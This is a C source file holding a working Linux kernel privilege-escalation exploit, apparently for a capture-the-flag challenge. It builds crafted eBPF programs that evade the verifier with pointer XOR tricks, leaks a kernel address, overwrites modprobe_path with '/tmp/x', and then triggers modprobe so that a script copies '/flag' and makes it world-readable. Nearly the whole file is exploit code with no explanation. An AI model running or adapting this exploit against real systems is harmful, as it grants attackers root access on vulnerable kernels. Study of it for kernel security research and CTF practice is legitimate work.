#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <stdint.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/syscall.h>
#include <sys/socket.h>
#include <errno.h>
#include <stdio.h>
#include <unistd.h>
#include <assert.h>
#include <string.h>
#include <stdlib.h>
#include <errno.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <stddef.h>
#include <stdlib.h>
#include "bpf_insn.h"
#include <linux/bpf.h>

int ctrlmapfd, expmapfd;
int progfd;
int sockets[2];
#define LOG_BUF_SIZE 65535
char bpf_log_buf[LOG_BUF_SIZE];


void x64dump(char *buf,uint32_t num)
{
	uint64_t *buf64 =  (uint64_t *)buf;
	printf("[--dump--] start : \n");
	for(int i=0;i<num;i++)
	{
			if(i%2==0 && i!=0)
			{
				printf("\n");
			}
			printf("0x%016lx ",*(buf64+i));
	}
	printf("\n[--dump--] end ... \n");
}
void loglx(char *tag,uint64_t num){
	printf("[lx] ");
	printf(" %-20s ",tag);
	printf(": %-#16lx\n",num);
}

static int bpf_prog_load(enum bpf_prog_type prog_type,
		const struct bpf_insn *insns, int prog_len,
		const char *license, int kern_version);
static int bpf_create_map(enum bpf_map_type map_type, int key_size, int value_size,
		int max_entries);
static int bpf_update_elem(int fd ,void *key, void *value,uint64_t flags);
static int bpf_lookup_elem(int fd,void *key, void *value);
static void writemsg(void);
static void __exit(char *err);



static void __exit(char *err) {
	fprintf(stderr, "[-] error: %s\n", err);
	exit(-1);
}
static void writemsg(void) {
	char buffer[64];
	ssize_t n = write(sockets[0], buffer, sizeof(buffer));
}


static int bpf_prog_load(enum bpf_prog_type prog_type,
		const struct bpf_insn *insns, int prog_len,
		const char *license, int kern_version){

	union bpf_attr attr = {
		.prog_type = prog_type,
		.insns = (uint64_t)insns,
		.insn_cnt = prog_len / sizeof(struct bpf_insn),
		.license = (uint64_t)license,
		.log_buf = (uint64_t)bpf_log_buf,
		.log_size = LOG_BUF_SIZE,
		.log_level = 2,
	};
	attr.kern_version = kern_version;
	bpf_log_buf[0] = 0;
	return syscall(__NR_bpf, BPF_PROG_LOAD, &attr, sizeof(attr));

}
static int bpf_create_map(enum bpf_map_type map_type, int key_size, int value_size,
		int max_entries){

	union bpf_attr attr = {
		.map_type = map_type,
		.key_size = key_size,
		.value_size = value_size,
		.max_entries = max_entries
	};
	return syscall(__NR_bpf, BPF_MAP_CREATE, &attr, sizeof(attr));

}
static int bpf_update_elem(int fd ,void *key, void *value,uint64_t flags){
	union bpf_attr attr = {
		.map_fd = fd,
		.key = (uint64_t)key,
		.value = (uint64_t)value,
		.flags = flags,
	};
	return syscall(__NR_bpf, BPF_MAP_UPDATE_ELEM, &attr, sizeof(attr));

}
static int bpf_lookup_elem(int fd,void *key, void *value){
	union bpf_attr attr = {
		.map_fd = fd,
		.key = (uint64_t)key,
		.value = (uint64_t)value,
	};
	return syscall(__NR_bpf, BPF_MAP_LOOKUP_ELEM, &attr, sizeof(attr));
}

		// BPF_MOV64_REG(BPF_REG_6, BPF_REG_1),
		// BPF_LD_ABS(BPF_B, ETH_HLEN + offsetof(struct iphdr, protocol) /* R0 = ip->proto */),
		// BPF_STX_MEM(BPF_W, BPF_REG_10, BPF_REG_0, -4), /* *(u32 *)(fp - 4) = r0 */
		// BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),
		// BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -4), /* r2 = fp - 4 */
		// BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_map_lookup_elem),
		// BPF_JMP_IMM(BPF_JEQ, BPF_REG_0, 0, 2),
		// BPF_MOV64_IMM(BPF_REG_1, 1), /* r1 = 1 */
		// BPF_RAW_INSN(BPF_STX | BPF_XADD | BPF_DW, BPF_REG_0, BPF_REG_1, 0, 0), /* xadd r0 += r1 */
		// BPF_MOV64_REG(BPF_REG_1, BPF_REG_10), /* r0 = 0 */
#define EXP_MAP_FD 0x103

struct bpf_insn insns[]={
	BPF_MOV64_IMM(BPF_REG_0, 0),
	BPF_STX_MEM(BPF_W, BPF_REG_10, BPF_REG_0, -4), /* *(u32 *)(fp - 4) = r0 */
	BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),
	BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -4), /* r2 = fp - 4 */
	BPF_LD_MAP_FD(BPF_REG_1, EXP_MAP_FD),
	BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_map_lookup_elem),
	BPF_JMP_IMM(BPF_JEQ, BPF_REG_0, 0, 11+1),

	BPF_MOV64_REG(BPF_REG_1, BPF_REG_0),
	BPF_MOV64_REG(BPF_REG_2, BPF_REG_0),
	BPF_MOV64_REG(BPF_REG_3, BPF_REG_0),
	BPF_ALU64_IMM(BPF_XOR, BPF_REG_2, 0), // convert r2,r1,r5 to scalar
	BPF_ALU64_IMM(BPF_XOR, BPF_REG_1, 0),
	BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, 0x21ef0+0x18),
	BPF_ALU64_REG(BPF_XOR, BPF_REG_0, BPF_REG_2), // r0 = dst ^ src
	BPF_ALU64_REG(BPF_XOR, BPF_REG_1, BPF_REG_0), // r1 = src ^ dst ^ src = dst
	BPF_LDX_MEM(BPF_DW, BPF_REG_2, BPF_REG_1, 0), // r2 = [dst] = kernel940
	BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, 0x451200), // r2 = &modprobe
	BPF_STX_MEM(BPF_DW, BPF_REG_3, BPF_REG_2, 0), // store and leak modprobe

	// even if we delete xor, leak still WORKS? I don't know why...
	BPF_JMP_IMM(BPF_JMP, BPF_REG_0, 0, 1),
	BPF_MOV64_IMM(BPF_REG_0, 0), /* r0 = 0 */
	BPF_EXIT_INSN(),
};

// struct bpf_insn insns[]={
// 		BPF_MOV64_IMM(BPF_REG_0, 0),
// 		BPF_STX_MEM(BPF_W, BPF_REG_10, BPF_REG_0, -4), /* *(u32 *)(fp - 4) = r0 */
// 		BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),
// 		BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -4), /* r2 = fp - 4 */
// 		BPF_LD_MAP_FD(BPF_REG_1, EXP_MAP_FD),
// 		BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_map_lookup_elem),
// 		BPF_JMP_IMM(BPF_JEQ, BPF_REG_0, 0, 8+1),

// 		BPF_MOV64_REG(BPF_REG_1, BPF_REG_0),
// 		BPF_MOV64_REG(BPF_REG_2, BPF_REG_0),
// 		BPF_ALU64_IMM(BPF_XOR, BPF_REG_2, 0), // convert r2,r1 to scalar
// 		BPF_ALU64_IMM(BPF_XOR, BPF_REG_1, 0),
// 		BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, 0x21ef0+0x18),
// 		BPF_ALU64_REG(BPF_XOR, BPF_REG_0, BPF_REG_2), // r0 = dst ^ src
// 		BPF_ALU64_IMM(BPF_XOR, BPF_REG_0, 0),
// 		BPF_LDX_MEM(BPF_DW, BPF_REG_2, BPF_REG_0, 0), // r2 = [dst] = kernel940

// 		// even if we delete xor, leak still WORKS? I don't know why...
// 		BPF_JMP_IMM(BPF_JMP, BPF_REG_0, 0, 1),
// 		BPF_MOV64_IMM(BPF_REG_0, 0), /* r0 = 0 */
// 		BPF_EXIT_INSN(),
// };
		// BPF_ALU64_REG(BPF_XOR, BPF_REG_6, BPF_REG_2), // r6 = src ^ &modprobe
		// BPF_MOV64_IMM(BPF_REG_1, 0x4141),
		// BPF_ALU64_REG(BPF_XOR, BPF_REG_5, BPF_REG_1), // r5 = src ^ src ^ &modprobe
		// BPF_LDX_MEM(BPF_DW, BPF_REG_1, BPF_REG_5, 0),

// BPF_LD_MAP_FD(BPF_REG_1, 4),
// BPF_MOV64_IMM(BPF_REG_2, 0),
// BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_get_local_storage),
// BPF_ALU64_IMM(BPF_ADD, BPF_REG_0, 1),
// BPF_MOV64_IMM(BPF_REG_0, 0), /* r0 = 0 */
// BPF_EXIT_INSN(),

char buffer[8];
int write_msg()
{
	ssize_t n = write(sockets[0], buffer, sizeof(buffer));
	if (n < 0)
	{
		perror("write");
		return 1;
	}
	if (n != sizeof(buffer))
	{
		fprintf(stderr, "short write: %ld\n", n);
	}
	return 0;
}

int exp_leak()
{
	for (int i = 0; i < 0x100; ++i)
	{
		assert(open("/dev/ptmx",1) >= 0);
	}
	expmapfd = bpf_create_map(BPF_MAP_TYPE_ARRAY,sizeof(int),0x300, 1);
	for (int i = 0; i < 0x100; ++i)
	{
		assert(open("/dev/ptmx",1) >= 0);
	}
	if(expmapfd<0){ __exit(strerror(errno));}
	printf("[+] expmapfd: %d \n", expmapfd);
	assert(expmapfd == EXP_MAP_FD);

	progfd = bpf_prog_load(BPF_PROG_TYPE_SOCKET_FILTER, insns, sizeof(insns), "GPL", 0);
	puts(bpf_log_buf);
	puts(strerror(errno));
	/* code */

	if(progfd < 0){ __exit(strerror(errno));}
	printf("[+] bpf_prog_load success\n");
	if(socketpair(AF_UNIX, SOCK_DGRAM, 0, sockets)){
		__exit(strerror(errno));
	}
	if(setsockopt(sockets[1], SOL_SOCKET, SO_ATTACH_BPF, &progfd, sizeof(progfd)) < 0){
		__exit(strerror(errno));
	}
	writemsg();
	// leak + 0x3ef0/0x21ef0 + 0x18 = kernel940
	// 0x940 + 0x451200 = modprobe
	// 0x782f706d742f /tmp/x
	int key = 0; uintptr_t val[0x400];
	assert(bpf_lookup_elem(expmapfd, &key, &val) == 0);
	printf("0x%lx %lu\n", *val, *val); // b40
	if ((*val & 0xfff) != 0xb40)
	{
		puts("Leakage failed, please re-start the kernel and re-run the exploit");
	}
	else
	{
		printf("Great! Run the exploit again using command `./exp %lu` to get flag\n", *val);
	}
	return 0;
}



int main(int argc, char const *argv[])
{
	if (argc <= 1)
	{
		return exp_leak();
	}
	uintptr_t modprobe = strtoul(argv[1], NULL, 10);
	uintptr_t tmp_x = 0x782f706d742f;
	printf("0x%lx %lu \n", modprobe, modprobe);

	expmapfd = bpf_create_map(BPF_MAP_TYPE_ARRAY,sizeof(int),0x300, 1);
	if(expmapfd<0){ __exit(strerror(errno));}
	printf("[+] expmapfd: %d \n", expmapfd);

	struct bpf_insn insns2[]={
		BPF_MOV64_IMM(BPF_REG_0, 0),
		BPF_STX_MEM(BPF_W, BPF_REG_10, BPF_REG_0, -4), /* *(u32 *)(fp - 4) = r0 */
		BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),
		BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -4), /* r2 = fp - 4 */
		BPF_LD_MAP_FD(BPF_REG_1, expmapfd),
		BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_map_lookup_elem),
		BPF_JMP_IMM(BPF_JEQ, BPF_REG_0, 0, 28+1),

		BPF_MOV64_REG(BPF_REG_3, BPF_REG_0),
		BPF_ALU64_IMM(BPF_XOR, BPF_REG_3, 0),
		BPF_ALU64_IMM(BPF_XOR, BPF_REG_0, 0),
		BPF_MOV64_IMM(BPF_REG_1, 0),
		BPF_MOV64_IMM(BPF_REG_2, (modprobe >> 0x30) & 0xffff),
		BPF_ALU64_IMM(BPF_LSH, BPF_REG_2, 0x30),
		BPF_ALU64_REG(BPF_OR, BPF_REG_1, BPF_REG_2),
		BPF_MOV64_IMM(BPF_REG_2, (modprobe >> 0x20) & 0xffff),
		BPF_ALU64_IMM(BPF_LSH, BPF_REG_2, 0x20),
		BPF_ALU64_REG(BPF_OR, BPF_REG_1, BPF_REG_2),
		BPF_MOV64_IMM(BPF_REG_2, (modprobe >> 0x10) & 0xffff),
		BPF_ALU64_IMM(BPF_LSH, BPF_REG_2, 0x10),
		BPF_ALU64_REG(BPF_OR, BPF_REG_1, BPF_REG_2),
		BPF_MOV64_IMM(BPF_REG_2, (modprobe) & 0xffff),
		BPF_ALU64_REG(BPF_OR, BPF_REG_1, BPF_REG_2), // r1 = &modprobe
		BPF_ALU64_REG(BPF_XOR, BPF_REG_0, BPF_REG_1), // r0 = src ^ &modprobe
		BPF_ALU64_IMM(BPF_XOR, BPF_REG_0, 0), // convert r0 back to PTR_TO_MAP_VALUE
		BPF_ALU64_REG(BPF_XOR, BPF_REG_3, BPF_REG_0), // r3 = src ^ src ^ &modprobe
		BPF_MOV64_IMM(BPF_REG_4, 0),
		BPF_MOV64_IMM(BPF_REG_2, (tmp_x >> 0x20) & 0xffff),
		BPF_ALU64_IMM(BPF_LSH, BPF_REG_2, 0x20),
		BPF_ALU64_REG(BPF_OR, BPF_REG_4, BPF_REG_2),
		BPF_MOV64_IMM(BPF_REG_2, (tmp_x >> 0x10) & 0xffff),
		BPF_ALU64_IMM(BPF_LSH, BPF_REG_2, 0x10),
		BPF_ALU64_REG(BPF_OR, BPF_REG_4, BPF_REG_2),
		BPF_MOV64_IMM(BPF_REG_2, (tmp_x) & 0xffff),
		BPF_ALU64_REG(BPF_OR, BPF_REG_4, BPF_REG_2), // r4 = /tmp/x
		BPF_STX_MEM(BPF_DW, BPF_REG_3, BPF_REG_4, 0),

		// even if we delete xor, leak still WORKS? I don't know why...
		BPF_JMP_IMM(BPF_JMP, BPF_REG_0, 0, 1),
		BPF_MOV64_IMM(BPF_REG_0, 0), /* r0 = 0 */
		BPF_EXIT_INSN(),
	};

	progfd = bpf_prog_load(BPF_PROG_TYPE_SOCKET_FILTER, insns2, sizeof(insns2), "GPL", 0);
	puts(bpf_log_buf);
	puts(strerror(errno));

	if(progfd < 0){ __exit(strerror(errno));}
	printf("[+] bpf_prog_load success\n");
	if(socketpair(AF_UNIX, SOCK_DGRAM, 0, sockets)){
		__exit(strerror(errno));
	}
	if(setsockopt(sockets[1], SOL_SOCKET, SO_ATTACH_BPF, &progfd, sizeof(progfd)) < 0){
		__exit(strerror(errno));
	}
	writemsg();

	// getchar();

    system("echo '#!/bin/sh\ncp /flag /tmp/flag\nchmod 777 /tmp/flag' > /tmp/x");
    system("chmod +x /tmp/x");

    system("echo -ne '\\xff\\xff\\xff\\xff' > /tmp/dummy");
    system("chmod +x /tmp/dummy");

    puts("[*] Run unknown file");
    system("/tmp/dummy");

    puts("[*] Hopefully flag is readable");
    system("cat /tmp/flag");
	return 0;
}